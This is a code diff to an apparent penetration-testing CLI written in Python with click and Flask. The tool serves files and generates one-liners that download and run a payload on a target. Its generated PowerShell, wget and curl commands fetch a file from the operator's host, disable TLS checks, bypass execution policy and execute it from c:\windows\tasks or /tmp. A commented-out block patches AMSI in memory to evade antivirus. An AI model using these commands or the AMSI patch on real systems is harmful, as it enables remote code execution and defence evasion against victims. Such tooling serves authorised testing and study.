@@ -56,12 +56,21 @@ def get_interface_ip(interface):
     except Exception as e:
         return None
 
-def get_serving_ip():
-    interfaces = ['tun0', 'eth0']
-    for interface in interfaces:
+def get_serving_ip(interface=None, ip=None):
+    if interface:
         try:
             ip = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
+            print(f"Fetched IP for {interface}: {ip}")  # Debugging line
             return ip, interface
+        except Exception as e:
+            click.echo(f"Could not find IP for interface {interface}. Trying default interfaces.")
+
+
+    interfaces = ['eth0', 'tun0']  
+    for iface in interfaces:
+        try:
+            ip = ni.ifaddresses(iface)[ni.AF_INET][0]['addr']
+            return ip, iface
         except Exception as e:
             continue
     return '0.0.0.0', 'None'
@@ -130,6 +139,7 @@ def load_config(file_path):
 
 
 def generate_code_outputs(protocol, ip_address, port, filename):
+
     code_outputs = []
 
     if filename:
@@ -138,15 +148,36 @@ def generate_code_outputs(protocol, ip_address, port, filename):
                 f"Add-Type -TypeDefinition \"using System.Net;using System.Security.Cryptography.X509Certificates;"
                 f"public class SSLValidator {{public static void Ignore() {{ServicePointManager.ServerCertificateValidationCallback += "
                 f"(sender, certificate, chain, sslPolicyErrors) => true;}}}}\" -Language CSharp; [SSLValidator]::Ignore();"
-                f" $webclient = New-Object System.Net.WebClient; $webclient.DownloadFile('{protocol}://{ip_address}:{port}/{filename}', 'c:\\windows\\temp\\{filename}');Start-Process 'c:\\windows\\temp\\{filename}'"
+                f" $webclient = New-Object System.Net.WebClient; $webclient.DownloadFile('{protocol}://{ip_address}:{port}/{filename}', 'c:\\windows\\tasks\\{filename}'); powershell -ep bypass; Start-Process 'c:\\windows\\tasks\\{filename}'"
             )
+            # csharp_ignore_tls = (
+            #     f"$function:lookFuncAddr = {{Param($moduleName, $functionName);"
+            #     f"$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {{ $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }}).GetType('Microsoft.Win32.UnsafeNativeMethods');"
+            #     f"$tmp=@();"
+            #     f"$assem.GetMethods() | ForEach-Object {{If($_.Name -eq 'GetProcAddress') {{$tmp+=$_}}}};"
+            #     f"return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))}}; "
+            #     f"$function:getDelegateType = {{Param([Parameter(Position = 0, Mandatory = $True)] [Type[]] $func, [Parameter(Position = 1)] [Type] $delType = [Void]);"
+            #     f"$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate]);"
+            #     f"$type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed');"
+            #     f"$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed');"
+            #     f"return $type.CreateType()}}; "
+            #     f"[IntPtr]$amsiAddr = lookFuncAddr 'amsi.dll' 'AmsiOpenSession'; $oldProtect = 0; "
+            #     f"$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lookFuncAddr 'kernel32.dll' 'VirtualProtect'), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool]))); "
+            #     f"$vp.Invoke($amsiAddr, 3, 0x40, [ref]$oldProtect); "
+            #     f"$3b = [Byte[]] (0x48, 0x31, 0xC0); [System.Runtime.InteropServices.Marshal]::Copy($3b, 0, $amsiAddr, 3); "
+            #     f"$vp.Invoke($amsiAddr, 3, 0x20, [ref]$oldProtect); "
+            #     f"Add-Type -TypeDefinition \"using System.Net;using System.Security.Cryptography.X509Certificates; public class SSLValidator {{public static void Ignore() {{ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;}}}}\" -Language CSharp; "
+            #     f"[SSLValidator]::Ignore(); $webclient = New-Object System.Net.WebClient; "
+            #     f"$webclient.DownloadFile('https://{ip_address}:{port}/{filename}', 'c:\\windows\\tasks\\{filename}'); "
+            #     f"powershell -ep bypass; Start-Process 'c:\\windows\\tasks\\{filename}'"
+            # ).replace("\n", "").replace("  ", " ")
 
             wget_ignore_tls = f"wget --no-check-certificate {protocol}://{ip_address}:{port}/{filename} -O /tmp/{filename} && chmod +x /tmp/{filename} && /tmp/{filename}"
 
             curl_ignore_tls = f"curl -k {protocol}://{ip_address}:{port}/{filename} -o /tmp/{filename} && chmod +x /tmp/{filename} && /tmp/{filename}"
 
             powershell_ignore_tls = ( 
-                            f"$AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'; [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols; $WebClient = New-Object System.Net.WebClient; $WebClient.DownloadFile('{protocol}://{ip_address}:{port}/{filename}', 'c:\\windows\\temp\\{filename}'); Start-Process 'c:\\windows\\temp\\{filename}'"
+                            f"$AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'; [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols; $WebClient = New-Object System.Net.WebClient; $WebClient.DownloadFile('{protocol}://{ip_address}:{port}/{filename}', 'c:\\windows\\tasks\\{filename}'); Start-Process 'c:\\windows\\tasks\\{filename}'"
             )
 
             code_outputs.extend([
@@ -158,14 +189,14 @@ def generate_code_outputs(protocol, ip_address, port, filename):
 
         else:
             csharp = (
-                f"$webclient = New-Object System.Net.WebClient; $webclient.DownloadFile('{protocol}://{ip_address}:{port}/{filename}', 'c:\\windows\\temp\\{filename}'); Start-Process 'c:\\windows\\temp\\{filename}'"
+                f"$webclient = New-Object System.Net.WebClient; $webclient.DownloadFile('{protocol}://{ip_address}:{port}/{filename}', 'c:\\windows\\tasks\\{filename}'); Start-Process 'c:\\windows\\tasks\\{filename}'"
             )
 
             wget = f"wget {protocol}://{ip_address}:{port}/{filename} -O /tmp/{filename} && chmod +x /tmp/{filename} && /tmp/{filename}"
 
             curl = f"curl {protocol}://{ip_address}:{port}/{filename} -o /tmp/{filename} && chmod +x /tmp/{filename} && /tmp/{filename}"
 
-            powershell = f"Invoke-WebRequest -Uri {protocol}://{ip_address}:{port}/{filename} -OutFile c:\\windows\\temp\\{filename}; Start-Process c:\\windows\\temp\\{filename}"
+            powershell = f"Invoke-WebRequest -Uri {protocol}://{ip_address}:{port}/{filename} -OutFile c:\\windows\\tasks\\{filename}; Start-Process c:\\windows\\tasks\\{filename}"
 
             code_outputs.extend([
                 ("csharp", csharp),
@@ -178,6 +209,8 @@ def generate_code_outputs(protocol, ip_address, port, filename):
     return code_outputs
 
 def print_server_info(path_to_serve, protocol, ip_address, interface_name, port, filename, cert=None, privkey=None):
+    # Make sure the values are as expected
+    print(f"IP Address: {ip_address}, Interface: {interface_name}")  # Debugging line
     click.clear()
     base_dir = os.getcwd()  
     relative_path = os.path.relpath(path_to_serve, start=base_dir)
@@ -204,9 +237,16 @@ def print_server_info(path_to_serve, protocol, ip_address, interface_name, port,
 
 
           
-def serve_files(path_to_serve, http_port=80, https_port=443):
+def serve_files(path_to_serve, http_port=None, https_port=None, interface_name=None):
     path_to_serve = os.path.abspath(path_to_serve)
-    print(path_to_serve)
+    ip_address, used_interface = get_serving_ip(interface_name)
+    print(f"Using IP: {ip_address} on Interface: {used_interface}")  # Debugging line
+   
+    
+    port = http_port if http_port is not None else https_port
+    protocol = "http" if http_port else "https"
+
+    # Set up routing based on whether the path is a directory or a specific file
     if os.path.isdir(path_to_serve):
         @app.route('/')
         def index():
@@ -217,11 +257,8 @@ def serve_files(path_to_serve, http_port=80, https_port=443):
         @app.route('/<path:filename>')
         def serve_file(filename):
             return send_from_directory(path_to_serve, filename)
-        
-        filename = os.path.basename(path_to_serve)
     else:
-        directory, filename = os.path.split(path_to_serve)   
-                
+        directory, filename = os.path.split(path_to_serve)
         @app.route('/')
         def index():
             return f'<a href="/{filename}">-> {filename}</a>'
@@ -230,17 +267,14 @@ def serve_files(path_to_serve, http_port=80, https_port=443):
         def serve_file():
             return send_from_directory(directory, filename)
 
-    protocol = "http" if http_port else "https"
-    ip_address, interface_name = get_serving_ip()
-    port = http_port or https_port
-
-    
     cert_path, key_path = None, None
     if https_port:
-        cert_path, key_path = generate_self_signed_cert(cert_dir)
-        
-    print_server_info(path_to_serve, protocol, ip_address, interface_name, port, filename, cert_path, key_path)
 
+        cert_path, key_path = generate_self_signed_cert(cert_dir)  
+
+
+    print_server_info(path_to_serve, protocol, ip_address, used_interface, port, filename, cert_path, key_path)
+    
     @app.before_request
     def log_request_info():
         client_ip = request.remote_addr
@@ -320,8 +354,10 @@ def cli(ctx, debug):
 @click.option('-f', '--file', type=click.Path(exists=True, dir_okay=False), help="Serve a file")
 @click.option('--http', type=int, default=None, help="Use HTTP with a custom port")
 @click.option('--https', type=int, default=None, help="Use HTTPS with a custom port")
+@click.option('-i', '--iface', default=None, help="Specify the network interface to use (e.g., eth0, wlan0)")
+
 @click.pass_context
-def serve(ctx, list_flag, search, use, file, http, https):
+def serve(ctx, list_flag, search, use, file, http, https, iface):
     """Serve files."""          
     if not any([list_flag, search, use, file, http, https]):
         click.echo(ctx.get_help())
@@ -342,19 +378,15 @@ def serve(ctx, list_flag, search, use, file, http, https):
         click.echo(click.style(f"\n[*] ", fg='red') + click.style("You must provide a search term along with --use.\n", fg='yellow'))
         return
 
-    if directory:
-        if not http and not https:
-            https = 443  
-        serve_files(directory, http, https)
-        return
 
     if file:
         file = os.path.abspath(file)  # Convert to absolute path
         if not http and not https:
             https = 443  
-        serve_files(file, http, https)
-        return 
+        serve_files(file, http, https, iface)
 
+        return 
+    
 @cli.command()
 @click.option('--update', is_flag=True, help='Check and download missing tools.')
 @click.option('--update-self', is_flag=True, help='Update the tool using pip.')
@@ -394,4 +426,3 @@ def update_pip3():
 if __name__ == "__main__":
     target_directory = os.path.dirname(os.path.abspath(__file__))   
     cli(obj={})
-    
